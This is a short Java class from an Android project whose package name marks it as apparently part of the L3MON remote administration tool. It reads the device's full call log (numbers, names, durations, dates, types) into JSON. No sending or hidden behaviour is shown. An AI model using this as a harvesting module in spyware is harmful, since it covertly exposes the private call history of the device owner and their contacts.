package com.etechd.l3mon.features.calls;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import com.etechd.l3mon.core.L3monApp;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallsManager {

    private static final String TAG = "CallsManager";

    public static JSONObject getCallsLogs() {
        JSONObject callsJson = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            Context context = L3monApp.getContext();
            Uri allCalls = CallLog.Calls.CONTENT_URI;
            try (Cursor cur = context.getContentResolver()
                    .query(allCalls, null, null, null, CallLog.Calls.DATE + " DESC")) {

                if (cur != null) {
                    int numIdx = cur.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int durationIdx = cur.getColumnIndex(CallLog.Calls.DURATION);
                    int dateIdx = cur.getColumnIndex(CallLog.Calls.DATE);
                    int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);

                    while (cur.moveToNext()) {
                        JSONObject call = new JSONObject();
                        call.put("phoneNo", numIdx != -1 ? cur.getString(numIdx) : "");
                        call.put("name", nameIdx != -1 ? cur.getString(nameIdx) : "");
                        call.put("duration", durationIdx != -1 ? cur.getString(durationIdx) : "");
                        call.put("date", dateIdx != -1 ? cur.getString(dateIdx) : "");
                        call.put("type", typeIdx != -1 ? cur.getInt(typeIdx) : -1);
                        list.put(call);
                    }
                }

            } catch (SecurityException se) {
                Log.e(TAG, "Permission denied for reading call logs", se);
            } catch (Exception e) {
                Log.e(TAG, "Error querying call logs", e);
            }

            callsJson.put("callsList", list);

        } catch (Exception e) {
            Log.e(TAG, "Error constructing JSON for calls", e);
        }

        return callsJson;
    }
}
